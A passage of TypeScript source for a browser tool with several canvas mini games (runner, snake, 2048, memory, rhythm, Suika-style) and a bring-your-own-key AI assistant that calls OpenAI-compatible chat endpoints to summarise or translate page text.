      if (y > groundY) {
        y = groundY;
        vy = 0;
      }
      for (const o of obs) o.x -= speed;
      while (obs.length > 0 && obs[0].x + obs[0].w < 0) {
        obs.shift();
        score++;
        setScore(score);
        // 加速を緩やかにし、上限を設けて難易度が上がりすぎないようにする。
        if (score % 40 === 0 && speed < 4.5) speed += 0.1;
      }
      const last = obs[obs.length - 1];
      // 障害物の最小間隔を広げて、ジャンプのタイミングに余裕を作る。
      if (!last || last.x < W - 720 - Math.random() * 360) {
        const h = 10 + Math.random() * 8;
        obs.push({ x: W + 20, w: 8 + Math.random() * 6, h });
      }
      // 衝突判定
      const px = x;
      const py = y - 30;
      const pw = 26;
      const ph = 30;
      for (const o of obs) {
        const ox = o.x;
        const oy = groundY - o.h;
        if (px + pw > ox && px < ox + o.w && py + ph > oy && py < oy + o.h) {
          alive = false;
        }
      }
    }

    // プレイヤ (🦖 風の四角)
    ctx.fillStyle = "#3a7";
    ctx.fillRect(x, y - 30, 26, 30);
    ctx.fillStyle = "#000";
    ctx.fillRect(x + 18, y - 26, 4, 4);

    // 障害物 (サボテン)
    ctx.fillStyle = "#284";
    for (const o of obs) {
      ctx.fillRect(o.x, groundY - o.h, o.w, o.h);
    }

    if (!alive) {
      ctx.fillStyle = "rgba(0,0,0,0.5)";
      ctx.fillRect(0, 0, W, H);
      ctx.fillStyle = "#fff";
      ctx.font = "24px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText("ゲームオーバー", W / 2, H / 2 - 10);
      ctx.font = "14px sans-serif";
      ctx.fillText("クリック または スペース で再開", W / 2, H / 2 + 14);
      ctx.textAlign = "start";
    }

    raf = requestAnimationFrame(loop);
  };
  raf = requestAnimationFrame(loop);

  return () => {
    cancelAnimationFrame(raf);
    removeKey();
    canvas.removeEventListener("click", onClick);
  };
}

// ---- 🐍 スネーク ----
function startSnakeGame(
  canvas: HTMLCanvasElement,
  setScore: (n: number) => void,
): () => void {
  const ctx = canvas.getContext("2d")!;
  const cell = 16;
  const cols = Math.floor(canvas.width / cell);
  const rows = Math.floor(canvas.height / cell);
  let snake: { x: number; y: number }[] = [
    { x: 10, y: 10 },
    { x: 9, y: 10 },
    { x: 8, y: 10 },
  ];
  let dir = { x: 1, y: 0 };
  let pendingDir = dir;
  let food = { x: 15, y: 10 };
  let alive = true;
  let score = 0;
  const placeFood = (): void => {
    while (true) {
      const f = {
        x: Math.floor(Math.random() * cols),
        y: Math.floor(Math.random() * rows),
      };
      if (!snake.some((s) => s.x === f.x && s.y === f.y)) {
        food = f;
        return;
      }
    }
  };

  const removeKey = attachKeyHandler(canvas, (e) => {
    if (e.key === "ArrowUp" && dir.y !== 1) pendingDir = { x: 0, y: -1 };
    else if (e.key === "ArrowDown" && dir.y !== -1) pendingDir = { x: 0, y: 1 };
    else if (e.key === "ArrowLeft" && dir.x !== 1) pendingDir = { x: -1, y: 0 };
    else if (e.key === "ArrowRight" && dir.x !== -1)
      pendingDir = { x: 1, y: 0 };
  });

  let timer = 0;
  const tick = (): void => {
    if (alive) {
      dir = pendingDir;
      const head = { x: snake[0].x + dir.x, y: snake[0].y + dir.y };
      if (
        head.x < 0 ||
        head.x >= cols ||
        head.y < 0 ||
        head.y >= rows ||
        snake.some((s) => s.x === head.x && s.y === head.y)
      ) {
        alive = false;
      } else {
        snake.unshift(head);
        if (head.x === food.x && head.y === food.y) {
          score++;
          setScore(score);
          placeFood();
        } else {
          snake.pop();
        }
      }
    }
    // 描画
    ctx.fillStyle = "#f7f7f7";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#c44";
    ctx.fillRect(food.x * cell, food.y * cell, cell - 2, cell - 2);
    ctx.fillStyle = "#284";
    for (const s of snake) {
      ctx.fillRect(s.x * cell, s.y * cell, cell - 2, cell - 2);
    }
    if (!alive) {
      ctx.fillStyle = "rgba(0,0,0,0.5)";
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "#fff";
      ctx.font = "24px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText("ゲームオーバー", canvas.width / 2, canvas.height / 2);
      ctx.textAlign = "start";
    }
  };
  timer = window.setInterval(tick, 140);
  placeFood();

  return () => {
    clearInterval(timer);
    removeKey();
  };
}

// ---- 🔢 2048 ----
function start2048Game(
  canvas: HTMLCanvasElement,
  setScore: (n: number) => void,
): () => void {
  const ctx = canvas.getContext("2d")!;
  const N = 4;
  const size = Math.min(canvas.width, canvas.height) - 20;
  const cell = Math.floor(size / N);
  const offX = (canvas.width - cell * N) / 2;
  const offY = (canvas.height - cell * N) / 2;
  let board: number[][] = Array.from(
    { length: N },
    () => Array(N).fill(0) as number[],
  );
  let score = 0;
  let over = false;
  const colors: Record<number, string> = {
    0: "#ccc0b3",
    2: "#eee4da",
    4: "#ede0c8",
    8: "#f2b179",
    16: "#f59563",
    32: "#f67c5f",
    64: "#f65e3b",
    128: "#edcf72",
    256: "#edcc61",
    512: "#edc850",
    1024: "#edc53f",
    2048: "#edc22e",
  };

  const addRandom = (): void => {
    const empties: [number, number][] = [];
    for (let r = 0; r < N; r++) {
      for (let c = 0; c < N; c++) {
        if (board[r][c] === 0) empties.push([r, c]);
      }
    }
    if (empties.length === 0) return;
    const [r, c] = empties[Math.floor(Math.random() * empties.length)];
    board[r][c] = Math.random() < 0.9 ? 2 : 4;
  };

  const slide = (row: number[]): { row: number[]; gain: number } => {
    let arr = row.filter((v) => v !== 0);
    let gain = 0;
    for (let i = 0; i < arr.length - 1; i++) {
      if (arr[i] === arr[i + 1]) {
        arr[i] *= 2;
        gain += arr[i];
        arr.splice(i + 1, 1);
      }
    }
    while (arr.length < N) arr.push(0);
    return { row: arr, gain };
  };

  const move = (dir: "L" | "R" | "U" | "D"): boolean => {
    const before = JSON.stringify(board);
    let totalGain = 0;
    if (dir === "L" || dir === "R") {
      for (let r = 0; r < N; r++) {
        let row = board[r].slice();
        if (dir === "R") row.reverse();
        const { row: nr, gain } = slide(row);
        totalGain += gain;
        if (dir === "R") nr.reverse();
        board[r] = nr;
      }
    } else {
      for (let c = 0; c < N; c++) {
        let col = board.map((r) => r[c]);
        if (dir === "D") col.reverse();
        const { row: nc, gain } = slide(col);
        totalGain += gain;
        if (dir === "D") nc.reverse();
        for (let r = 0; r < N; r++) board[r][c] = nc[r];
      }
    }
    score += totalGain;
    if (totalGain > 0) setScore(score);
    return JSON.stringify(board) !== before;
  };

  const isOver = (): boolean => {
    for (let r = 0; r < N; r++)
      for (let c = 0; c < N; c++) {
        if (board[r][c] === 0) return false;
        if (c + 1 < N && board[r][c] === board[r][c + 1]) return false;
        if (r + 1 < N && board[r][c] === board[r + 1][c]) return false;
      }
    return true;
  };

  const draw = (): void => {
    ctx.fillStyle = "#1a1a1a";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#bbada0";
    ctx.fillRect(offX - 5, offY - 5, cell * N + 10, cell * N + 10);
    for (let r = 0; r < N; r++) {
      for (let c = 0; c < N; c++) {
        const v = board[r][c];
        ctx.fillStyle = colors[v] ?? "#3c3a32";
        const x = offX + c * cell + 4;
        const y = offY + r * cell + 4;
        ctx.fillRect(x, y, cell - 8, cell - 8);
        if (v) {
          ctx.fillStyle = v <= 4 ? "#776e65" : "#f9f6f2";
          const fs = v < 100 ? 32 : v < 1000 ? 26 : 22;
          ctx.font = `bold ${fs}px sans-serif`;
          ctx.textAlign = "center";
          ctx.textBaseline = "middle";
          ctx.fillText(String(v), x + (cell - 8) / 2, y + (cell - 8) / 2);
        }
      }
    }
    ctx.textAlign = "start";
    ctx.textBaseline = "alphabetic";
    if (over) {
      ctx.fillStyle = "rgba(255,255,255,0.7)";
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "#000";
      ctx.font = "24px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText("ゲームオーバー", canvas.width / 2, canvas.height / 2);
      ctx.textAlign = "start";
    }
  };

  addRandom();
  addRandom();
  draw();

  const removeKey = attachKeyHandler(canvas, (e) => {
    if (over) return;
    let moved = false;
    if (e.key === "ArrowLeft") moved = move("L");
    else if (e.key === "ArrowRight") moved = move("R");
    else if (e.key === "ArrowUp") moved = move("U");
    else if (e.key === "ArrowDown") moved = move("D");
    if (moved) {
      addRandom();
      if (isOver()) over = true;
    }
    draw();
  });

  return () => {
    removeKey();
  };
}

// ---- 🧠 神経衰弱 ----
function startMemoryGame(
  grid: HTMLDivElement,
  setScore: (n: number) => void,
): () => void {
  const symbols = ["🍎", "🍊", "🍇", "🍓", "🍌", "🍒"];
  const deck = [...symbols, ...symbols]
    .map((s) => ({ s, r: Math.random() }))
    .sort((a, b) => a.r - b.r)
    .map((o) => o.s);
  grid.innerHTML = "";
  grid.style.display = "grid";
  grid.style.gridTemplateColumns = "repeat(4, 70px)";
  grid.style.gap = "6px";

  const cards: HTMLButtonElement[] = [];
  let flipped: number[] = [];
  let matched = 0;
  let score = 0;
  let busy = false;

  deck.forEach((sym, i) => {
    const b = document.createElement("button");
    b.type = "button";
    b.dataset.sym = sym;
    b.dataset.idx = String(i);
    b.style.cssText =
      "width:70px;height:70px;font-size:32px;border-radius:8px;border:1px solid #555;background:#445;color:#445;cursor:pointer";
    b.textContent = "?";
    const flip = (show: boolean): void => {
      if (show) {
        b.textContent = sym;
        b.style.background = "#fff";
        b.style.color = "#000";
      } else {
        b.textContent = "?";
        b.style.background = "#445";
        b.style.color = "#445";
      }
    };
    (b as HTMLButtonElement & { flip: typeof flip }).flip = flip;
    b.addEventListener("click", () => {
      if (busy || b.disabled || flipped.includes(i)) return;
      flip(true);
      flipped.push(i);
      if (flipped.length === 2) {
        busy = true;
        const [a, c] = flipped;
        if (cards[a].dataset.sym === cards[c].dataset.sym) {
          cards[a].disabled = true;
          cards[c].disabled = true;
          matched++;
          score += 10;
          setScore(score);
          flipped = [];
          busy = false;
          if (matched === symbols.length) {
            setTimeout(() => alert(`クリア！ スコア ${score}`), 50);
          }
        } else {
          setTimeout(() => {
            (
              cards[a] as HTMLButtonElement & { flip: (s: boolean) => void }
            ).flip(false);
            (
              cards[c] as HTMLButtonElement & { flip: (s: boolean) => void }
            ).flip(false);
            flipped = [];
            busy = false;
          }, 700);
        }
      }
    });
    cards.push(b);
    grid.appendChild(b);
  });

  return () => {
    grid.innerHTML = "";
  };
}

// ---- 🎵 リズムゲーム (osu!mania 風 4 レーン) ----
function startRhythmGame(
  canvas: HTMLCanvasElement,
  setScore: (n: number) => void,
): () => void {
  const ctx = canvas.getContext("2d")!;
  const W = canvas.width;
  const H = canvas.height;
  const LANES = 4;
  const laneW = Math.min(80, Math.floor(W / (LANES + 2)));
  const totalW = laneW * LANES;
  const offX = (W - totalW) / 2;
  const judgeY = H - 50;
  const noteH = 14;
  const speed = 240; // px/sec
  const keys = ["d", "f", "j", "k"];
  const laneColors = ["#4cf", "#fc4", "#f6a", "#7f6"];

  interface Note {
    lane: number;
    time: number; // 判定時刻 (sec)
    hit: boolean;
    miss: boolean;
  }

  // 簡易譜面: 一定 BPM で擬似ランダム (シードに startTime を使う)
  const bpm = 110;
  const beat = 60 / bpm;
  const notes: Note[] = [];
  const songLen = 45; // 45 秒
  const seed = Math.floor(Math.random() * 1e9);
  let rngState = seed;
  const rng = (): number => {
    rngState = (rngState * 1664525 + 1013904223) >>> 0;
    return rngState / 0x100000000;
  };
  for (let t = 2; t < songLen; t += beat) {
    if (rng() < 0.55) {
      notes.push({
        lane: Math.floor(rng() * LANES),
        time: t,
        hit: false,
        miss: false,
      });
    }
    if (rng() < 0.08) {
      // 同時押し
      let lane2 = Math.floor(rng() * LANES);
      if (notes.length > 0 && notes[notes.length - 1].time === t) {
        while (lane2 === notes[notes.length - 1].lane) {
          lane2 = (lane2 + 1) % LANES;
        }
      }
      notes.push({ lane: lane2, time: t, hit: false, miss: false });
    }
  }

  let score = 0;
  let combo = 0;
  let maxCombo = 0;
  let judgeText = "";
  let judgeFlash = 0;
  const laneFlash = [0, 0, 0, 0];

  // WebAudio (BGM 代わりにメトロノーム + ヒット音)
  let audioCtx: AudioContext | null = null;
  try {
    audioCtx = new (
      window.AudioContext ||
      (window as unknown as { webkitAudioContext: typeof AudioContext })
        .webkitAudioContext
    )();
  } catch {
    audioCtx = null;
  }
  const playBeep = (freq: number, dur: number, vol = 0.15): void => {
    if (!audioCtx) return;
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.frequency.value = freq;
    osc.type = "square";
    gain.gain.value = vol;
    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + dur);
    osc.connect(gain);
    gain.connect(audioCtx.destination);
    osc.start();
    osc.stop(audioCtx.currentTime + dur);
  };

  const startTime = performance.now();
  let lastBeat = -1;

  const judge = (lane: number): void => {
    const now = (performance.now() - startTime) / 1000;
    laneFlash[lane] = 0.2;
    // 最も近い未ヒットノート
    let best: Note | null = null;
    let bestDiff = 999;
    for (const n of notes) {
      if (n.hit || n.miss) continue;
      if (n.lane !== lane) continue;
      const d = Math.abs(n.time - now);
      if (d < bestDiff) {
        bestDiff = d;
        best = n;
      }
    }
    if (!best || bestDiff > 0.25) {
      judgeText = "MISS";
      judgeFlash = 0.4;
      combo = 0;
      return;
    }
    best.hit = true;
    if (bestDiff < 0.08) {
      score += 300;
      judgeText = "PERFECT";
    } else if (bestDiff < 0.15) {
      score += 100;
      judgeText = "GREAT";
    } else {
      score += 50;
      judgeText = "GOOD";
    }
    combo++;
    if (combo > maxCombo) maxCombo = combo;
    judgeFlash = 0.4;
    setScore(score);
    playBeep(660, 0.05, 0.12);
  };

  const onKey = (e: KeyboardEvent): void => {
    const k = e.key.toLowerCase();
    const idx = keys.indexOf(k);
    if (idx >= 0) {
      e.preventDefault();
      judge(idx);
    }
  };
  canvas.addEventListener("keydown", onKey);

  const onClick = (e: MouseEvent): void => {
    const rect = canvas.getBoundingClientRect();
    const cx = e.clientX - rect.left;
    const lane = Math.floor((cx - offX) / laneW);
    if (lane >= 0 && lane < LANES) judge(lane);
  };
  canvas.addEventListener("click", onClick);

  let raf = 0;
  const loop = (): void => {
    const now = (performance.now() - startTime) / 1000;
    // メトロノーム
    const curBeat = Math.floor(now / beat);
    if (curBeat !== lastBeat && now > 0 && now < songLen) {
      lastBeat = curBeat;
      playBeep(curBeat % 4 === 0 ? 880 : 440, 0.03, 0.06);
    }

    // 自動 MISS 判定
    for (const n of notes) {
      if (!n.hit && !n.miss && now - n.time > 0.25) {
        n.miss = true;
        combo = 0;
        judgeText = "MISS";
        judgeFlash = 0.3;
      }
    }

    // 描画
    ctx.fillStyle = "#0e0e16";
    ctx.fillRect(0, 0, W, H);
    // レーン
    for (let i = 0; i < LANES; i++) {
      const x = offX + i * laneW;
      ctx.fillStyle = laneFlash[i] > 0 ? "rgba(255,255,255,0.12)" : "#181826";
      ctx.fillRect(x, 0, laneW - 2, H);
      // キー表示
      ctx.fillStyle = "#888";
      ctx.font = "bold 16px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText(keys[i].toUpperCase(), x + laneW / 2, H - 14);
      laneFlash[i] = Math.max(0, laneFlash[i] - 0.02);
    }
    // 判定ライン
    ctx.strokeStyle = "#fff";
    ctx.lineWidth = 2;
    ctx.beginPath();
    ctx.moveTo(offX, judgeY);
    ctx.lineTo(offX + totalW, judgeY);
    ctx.stroke();

    // ノート
    for (const n of notes) {
      if (n.hit) continue;
      const dt = n.time - now;
      const y = judgeY - dt * speed;
      if (y < -noteH || y > H) continue;
      const x = offX + n.lane * laneW + 2;
      ctx.fillStyle = n.miss ? "#555" : laneColors[n.lane];
      ctx.fillRect(x, y - noteH / 2, laneW - 6, noteH);
    }

    // 情報
    ctx.textAlign = "start";
    ctx.fillStyle = "#fff";
    ctx.font = "16px sans-serif";
    ctx.fillText(`Score: ${score}`, 8, 20);
    ctx.fillText(`Combo: ${combo} (Max ${maxCombo})`, 8, 40);
    const remain = Math.max(0, songLen - now);
    ctx.textAlign = "end";
    ctx.fillText(`残り ${remain.toFixed(1)}s`, W - 8, 20);
    ctx.textAlign = "start";

    if (judgeFlash > 0) {
      ctx.globalAlpha = Math.min(1, judgeFlash * 2.5);
      ctx.fillStyle =
        judgeText === "PERFECT"
          ? "#ff0"
          : judgeText === "GREAT"
            ? "#4f8"
            : judgeText === "GOOD"
              ? "#4cf"
              : "#f44";
      ctx.font = "bold 36px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText(judgeText, W / 2, H / 2);
      ctx.globalAlpha = 1;
      ctx.textAlign = "start";
      judgeFlash -= 0.02;
    }

    if (now > songLen + 1) {
      ctx.fillStyle = "rgba(0,0,0,0.7)";
      ctx.fillRect(0, 0, W, H);
      ctx.fillStyle = "#fff";
      ctx.font = "28px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText(
        `クリア！ Score ${score} / Max Combo ${maxCombo}`,
        W / 2,
        H / 2,
      );
      ctx.textAlign = "start";
      cancelAnimationFrame(raf);
      return;
    }

    raf = requestAnimationFrame(loop);
  };
  raf = requestAnimationFrame(loop);

  return () => {
    cancelAnimationFrame(raf);
    canvas.removeEventListener("keydown", onKey);
    canvas.removeEventListener("click", onClick);
    if (audioCtx) {
      try {
        audioCtx.close();
      } catch {
        // noop
      }
    }
  };
}

// ---- 🍉 スイカゲーム風 ----
function startSuikaGame(
  canvas: HTMLCanvasElement,
  setScore: (n: number) => void,
): () => void {
  const ctx = canvas.getContext("2d")!;
  const W = canvas.width;
  const H = canvas.height;
  // 果物 (半径, 色, ラベル, スコア)
  const FRUITS: { r: number; color: string; label: string; pt: number }[] = [
    { r: 14, color: "#f6c", label: "🍓", pt: 1 },
    { r: 18, color: "#f88", label: "🍒", pt: 3 },
    { r: 24, color: "#fa6", label: "🍊", pt: 6 },
    { r: 30, color: "#fd4", label: "🍋", pt: 10 },
    { r: 38, color: "#c8f", label: "🍇", pt: 15 },
    { r: 46, color: "#fc8", label: "🍑", pt: 21 },
    { r: 54, color: "#f64", label: "🍎", pt: 28 },
    { r: 64, color: "#fa4", label: "🥭", pt: 36 },
    { r: 76, color: "#4c8", label: "🍉", pt: 45 },
  ];
  const ceilingY = 28; // この高さを超えたらゲームオーバー
  interface Ball {
    x: number;
    y: number;
    vx: number;
    vy: number;
    type: number; // FRUITS index
    spawnAt: number;
  }
  const balls: Ball[] = [];
  let score = 0;
  let nextType = Math.floor(Math.random() * 3);
  let pointerX = W / 2;
  let dropCooldown = 0;
  let over = false;
  const gravity = 0.18;
  const restitution = 0.18;
  const friction = 0.99;

  const onMove = (e: MouseEvent): void => {
    const rect = canvas.getBoundingClientRect();
    pointerX = e.clientX - rect.left;
  };
  const onClick = (e: MouseEvent): void => {
    if (over) return;
    if (dropCooldown > 0) return;
    const rect = canvas.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const f = FRUITS[nextType];
    balls.push({
      x: Math.max(f.r + 2, Math.min(W - f.r - 2, x)),
      y: ceilingY - f.r - 2,
      vx: 0,
      vy: 0,
      type: nextType,
      spawnAt: performance.now(),
    });
    nextType = Math.floor(Math.random() * 3);
    dropCooldown = 25;
  };
  canvas.addEventListener("mousemove", onMove);
  canvas.addEventListener("click", onClick);

  const step = (): void => {
    if (dropCooldown > 0) dropCooldown--;
    // 重力 + 移動
    for (const b of balls) {
      b.vy += gravity;
      b.vx *= friction;
      b.x += b.vx;
      b.y += b.vy;
      const r = FRUITS[b.type].r;
      // 床
      if (b.y + r > H) {
        b.y = H - r;
        b.vy = -b.vy * restitution;
        if (Math.abs(b.vy) < 0.5) b.vy = 0;
      }
      // 壁
      if (b.x - r < 0) {
        b.x = r;
        b.vx = -b.vx * restitution;
      }
      if (b.x + r > W) {
        b.x = W - r;
        b.vx = -b.vx * restitution;
      }
    }
    // 衝突 (位置補正 & 反発)
    for (let iter = 0; iter < 4; iter++) {
      for (let i = 0; i < balls.length; i++) {
        for (let j = i + 1; j < balls.length; j++) {
          const a = balls[i];
          const b = balls[j];
          const ra = FRUITS[a.type].r;
          const rb = FRUITS[b.type].r;
          const dx = b.x - a.x;
          const dy = b.y - a.y;
          const d2 = dx * dx + dy * dy;
          const minD = ra + rb;
          if (d2 < minD * minD && d2 > 0.0001) {
            const d = Math.sqrt(d2);
            const overlap = minD - d;
            const nx = dx / d;
            const ny = dy / d;
            a.x -= (nx * overlap) / 2;
            a.y -= (ny * overlap) / 2;
            b.x += (nx * overlap) / 2;
            b.y += (ny * overlap) / 2;
            // 速度の反発
            const rvx = b.vx - a.vx;
            const rvy = b.vy - a.vy;
            const vn = rvx * nx + rvy * ny;
            if (vn < 0) {
              const e = restitution;
              const jimp = (-(1 + e) * vn) / 2;
              a.vx -= jimp * nx;
              a.vy -= jimp * ny;
              b.vx += jimp * nx;
              b.vy += jimp * ny;
            }
          }
        }
      }
    }
    // マージ判定
    for (let i = 0; i < balls.length; i++) {
      for (let j = i + 1; j < balls.length; j++) {
        const a = balls[i];
        const b = balls[j];
        if (a.type !== b.type) continue;
        if (a.type >= FRUITS.length - 1) continue;
        const ra = FRUITS[a.type].r;
        const rb = FRUITS[b.type].r;
        const dx = b.x - a.x;
        const dy = b.y - a.y;
        const d = Math.sqrt(dx * dx + dy * dy);
        if (d <= ra + rb + 0.5) {
          const newType = a.type + 1;
          const nx = (a.x + b.x) / 2;
          const ny = (a.y + b.y) / 2;
          balls.splice(j, 1);
          balls.splice(i, 1);
          balls.push({
            x: nx,
            y: ny,
            vx: 0,
            vy: -1,
            type: newType,
            spawnAt: performance.now(),
          });
          score += FRUITS[newType].pt;
          setScore(score);
          i = -1;
          break;
        }
      }
    }
    // ゲームオーバー判定 (天井超えが 1.5 秒以上継続)
    const now = performance.now();
    for (const b of balls) {
      const r = FRUITS[b.type].r;
      if (b.y - r < ceilingY && now - b.spawnAt > 1500) {
        over = true;
      }
    }
  };

  const draw = (): void => {
    ctx.fillStyle = "#fff7e6";
    ctx.fillRect(0, 0, W, H);
    // 天井ライン
    ctx.strokeStyle = "#e44";
    ctx.setLineDash([6, 4]);
    ctx.beginPath();
    ctx.moveTo(0, ceilingY);
    ctx.lineTo(W, ceilingY);
    ctx.stroke();
    ctx.setLineDash([]);
    // 次のフルーツプレビュー
    if (!over) {
      const nf = FRUITS[nextType];
      ctx.globalAlpha = 0.4;
      ctx.fillStyle = nf.color;
      ctx.beginPath();
      ctx.arc(
        Math.max(nf.r + 2, Math.min(W - nf.r - 2, pointerX)),
        ceilingY - nf.r - 2,
        nf.r,
        0,
        Math.PI * 2,
      );
      ctx.fill();
      ctx.globalAlpha = 1;
    }
    // ボール
    for (const b of balls) {
      const f = FRUITS[b.type];
      ctx.fillStyle = f.color;
      ctx.beginPath();
      ctx.arc(b.x, b.y, f.r, 0, Math.PI * 2);
      ctx.fill();
      ctx.strokeStyle = "rgba(0,0,0,0.25)";
      ctx.stroke();
      ctx.fillStyle = "#000";
      ctx.font = `${Math.floor(f.r * 1.1)}px sans-serif`;
      ctx.textAlign = "center";
      ctx.textBaseline = "middle";
      ctx.fillText(f.label, b.x, b.y);
    }
    ctx.textAlign = "start";
    ctx.textBaseline = "alphabetic";
    // HUD
    ctx.fillStyle = "#333";
    ctx.font = "14px sans-serif";
    ctx.fillText(`Score: ${score}`, 8, 18);
    ctx.fillText("クリックで落下", 8, 36);

    if (over) {
      ctx.fillStyle = "rgba(0,0,0,0.55)";
      ctx.fillRect(0, 0, W, H);
      ctx.fillStyle = "#fff";
      ctx.font = "26px sans-serif";
      ctx.textAlign = "center";
      ctx.fillText("ゲームオーバー", W / 2, H / 2 - 6);
      ctx.font = "14px sans-serif";
      ctx.fillText(`スコア ${score}`, W / 2, H / 2 + 18);
      ctx.textAlign = "start";
    }
  };

  let raf = 0;
  const loop = (): void => {
    if (!over) step();
    draw();
    raf = requestAnimationFrame(loop);
  };
  raf = requestAnimationFrame(loop);

  return () => {
    cancelAnimationFrame(raf);
    canvas.removeEventListener("mousemove", onMove);
    canvas.removeEventListener("click", onClick);
  };
}

// ===== ✨ AI アシスタント (BYOK) =====

interface AISettings {
  base: string;
  model: string;
  key: string;
}

const AI_PRESETS: Record<string, { base: string; model: string }> = {
  openai: { base: "https://api.openai.com/v1", model: "gpt-4o-mini" },
  groq: {
    base: "https://api.groq.com/openai/v1",
    model: "llama-3.3-70b-versatile",
  },
  openrouter: {
    base: "https://openrouter.ai/api/v1",
    model: "openai/gpt-4o-mini",
  },
  ollama: { base: "http://localhost:11434/v1", model: "llama3.2" },
  custom: { base: "", model: "" },
};

const AI_STORAGE_KEY = "yuzu-ai-settings-v1";

function loadAISettings(): AISettings {
  try {
    const raw = localStorage.getItem(AI_STORAGE_KEY);
    if (raw) {
      const j = JSON.parse(raw) as Partial<AISettings>;
      return {
        base: j.base ?? AI_PRESETS.openai.base,
        model: j.model ?? AI_PRESETS.openai.model,
        key: j.key ?? "",
      };
    }
  } catch {
    /* noop */
  }
  return {
    base: AI_PRESETS.openai.base,
    model: AI_PRESETS.openai.model,
    key: "",
  };
}

function saveAISettings(s: AISettings): void {
  try {
    localStorage.setItem(AI_STORAGE_KEY, JSON.stringify(s));
  } catch {
    /* noop */
  }
}

/** HTML から本文テキストを抽出 (script/style/nav/footer を除去) */
function extractMainText(html: string): { title: string; text: string } {
  let title = "";
  let text = "";
  try {
    const doc = new DOMParser().parseFromString(html, "text/html");
    title = doc.title || "";
    // 不要要素を削除
    doc
      .querySelectorAll(
        "script, style, noscript, iframe, svg, nav, footer, header, aside, form, .ad, .ads, .advertisement",
      )
      .forEach((el) => el.remove());
    const main =
      doc.querySelector("article") ||
      doc.querySelector("main") ||
      doc.querySelector("[role=main]") ||
      doc.body;
    text = (main?.textContent ?? "").replace(/\s+/g, " ").trim();
  } catch {
    text = html
      .replace(/<[^>]+>/g, " ")
      .replace(/\s+/g, " ")
      .trim();
  }
  return { title, text };
}

interface AIChatMessage {
  role: "system" | "user" | "assistant";
  content: string | AIContentPart[];
}
interface AIContentPart {
  type: "text" | "image_url";
  text?: string;
  image_url?: { url: string };
}

async function callOpenAICompatible(
  settings: AISettings,
  messages: AIChatMessage[],
  signal: AbortSignal,
  onDelta?: (chunk: string) => void,
): Promise<string> {
  const base = settings.base.replace(/\/+$/, "");
  const url = `${base}/chat/completions`;
  const headers: Record<string, string> = {
    "Content-Type": "application/json",
  };
  if (settings.key) headers["Authorization"] = `Bearer ${settings.key}`;
  const stream = !!onDelta;
  const res = await fetch(url, {
    method: "POST",
    headers,
    body: JSON.stringify({
      model: settings.model,
      messages,
      temperature: 0.4,
      stream,
    }),
    signal,
  });
  if (!res.ok) {
    let detail = "";
    try {
      detail = await res.text();
    } catch {
      /* noop */
    }
    throw new Error(`HTTP ${res.status}: ${detail.slice(0, 500)}`);
  }
  if (!stream) {
    const j = (await res.json()) as {
      choices?: { message?: { content?: string } }[];
      error?: { message?: string };
    };
    if (j.error?.message) throw new Error(j.error.message);
    const content = j.choices?.[0]?.message?.content;
    if (typeof content !== "string") {
      throw new Error("APIレスポンスにメッセージがありません");
    }
    return content;
  }
  // SSE ストリーミング解析
  if (!res.body) throw new Error("ストリーミング応答が空です");
  const reader = res.body.getReader();
  const decoder = new TextDecoder();
  let buf = "";
  let acc = "";
  while (true) {
    const { value, done } = await reader.read();
    if (done) break;
    buf += decoder.decode(value, { stream: true });
    let nl: number;
    while ((nl = buf.indexOf("\n")) >= 0) {
      const line = buf.slice(0, nl).trim();
      buf = buf.slice(nl + 1);
      if (!line || !line.startsWith("data:")) continue;
      const data = line.slice(5).trim();
      if (data === "[DONE]") return acc;
      try {
        const j = JSON.parse(data) as {
          choices?: { delta?: { content?: string } }[];
          error?: { message?: string };
        };
        if (j.error?.message) throw new Error(j.error.message);
        const piece = j.choices?.[0]?.delta?.content;
        if (typeof piece === "string" && piece.length > 0) {
          acc += piece;
          onDelta!(piece);
        }
      } catch (e) {
        // パース失敗は無視 (一部プロバイダのコメント行)
        if (e instanceof Error && e.message.includes("[")) throw e;
      }
    }
  }
  return acc;
}

let aiPageCache: { url: string; title: string; text: string } | null = null;
let aiAbort: AbortController | null = null;

function setupAITool(): void {
  const presetSel = $id<HTMLSelectElement>("ai-preset");
  const presetApply = $id<HTMLButtonElement>("ai-preset-apply");
  const baseEl = $id<HTMLInputElement>("ai-base");
  const modelEl = $id<HTMLInputElement>("ai-model");
  const keyEl = $id<HTMLInputElement>("ai-key");
  const keyToggle = $id<HTMLButtonElement>("ai-key-toggle");
  const saveBtn = $id<HTMLButtonElement>("ai-save");
  const sumBtn = $id<HTMLButtonElement>("ai-summarize");
  const trBtn = $id<HTMLButtonElement>("ai-translate");
  const tagBtn = $id<HTMLButtonElement>("ai-tags");
  const buzzBtn = $id<HTMLButtonElement>("ai-buzz");
  const tldrBtn = $id<HTMLButtonElement>("ai-tldr");
  const cancelBtn = $id<HTMLButtonElement>("ai-cancel");
  const askBtn = $id<HTMLButtonElement>("ai-ask");
  const questionEl = $id<HTMLInputElement>("ai-question");
  const incUrl = $id<HTMLInputElement>("ai-include-url");
  const fetchFresh = $id<HTMLInputElement>("ai-fetch-fresh");
  const maxCharsEl = $id<HTMLInputElement>("ai-maxchars");
  const out = $id<HTMLTextAreaElement>("ai-output");
  const statusEl = $id<HTMLSpanElement>("ai-status");
  const copyBtn = $id<HTMLButtonElement>("ai-copy");
  const dlBtn = $id<HTMLButtonElement>("ai-download");
  const clearBtn = $id<HTMLButtonElement>("ai-clear");
  if (!baseEl || !modelEl || !keyEl || !out) return;

  // 初期値ロード
  const init = loadAISettings();
  baseEl.value = init.base;
  modelEl.value = init.model;
  keyEl.value = init.key;

  presetApply?.addEventListener("click", () => {
    const k = presetSel?.value ?? "openai";
    const p = AI_PRESETS[k];
    if (!p) return;
    if (k !== "custom") {
      baseEl.value = p.base;
